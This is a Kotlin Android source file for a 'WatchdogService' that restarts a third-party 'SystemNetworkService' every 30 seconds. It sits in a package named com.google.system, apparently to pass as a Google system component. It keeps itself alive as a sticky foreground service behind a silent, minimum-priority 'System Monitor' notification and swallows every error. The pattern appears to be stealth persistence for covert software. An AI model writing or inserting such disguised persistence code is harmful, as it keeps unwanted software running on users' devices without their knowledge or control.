package com.google.system

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.Handler
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.openaccess.sdk.service.SystemNetworkService

class WatchdogService : Service() {
    
    private val handler = Handler(Looper.getMainLooper())
    private var isMonitoring = false
    
    private val checkRunnable = object : Runnable {
        override fun run() {
            try {
                if (!isServiceRunning(SystemNetworkService::class.java)) {
                    SystemNetworkService.start(applicationContext)
                }
            } catch (_: Exception) {}
            
            if (isMonitoring) {
                handler.postDelayed(this, 30000)
            }
        }
    }
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val notification = NotificationCompat.Builder(this, "watchdog_channel")
            .setContentTitle("System Monitor")
            .setContentText("Monitoring services")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(1002, notification)
        isMonitoring = true
        handler.post(checkRunnable)
    }
    
    override fun onDestroy() {
        isMonitoring = false
        handler.removeCallbacks(checkRunnable)
        super.onDestroy()
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
    
    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        return try {
            val manager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            manager.getRunningServices(100)?.any {
                it.service.className == serviceClass.name
            } ?: false
        } catch (_: Exception) {
            false
        }
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("watchdog_channel", "System Monitor", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            (getSystemService(NotificationManager::class.java)).createNotificationChannel(channel)
        }
    }
    
    companion object {
        fun start(context: Context) {
            try {
                val intent = Intent(context, WatchdogService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (_: Exception) {}
        }
    }
}
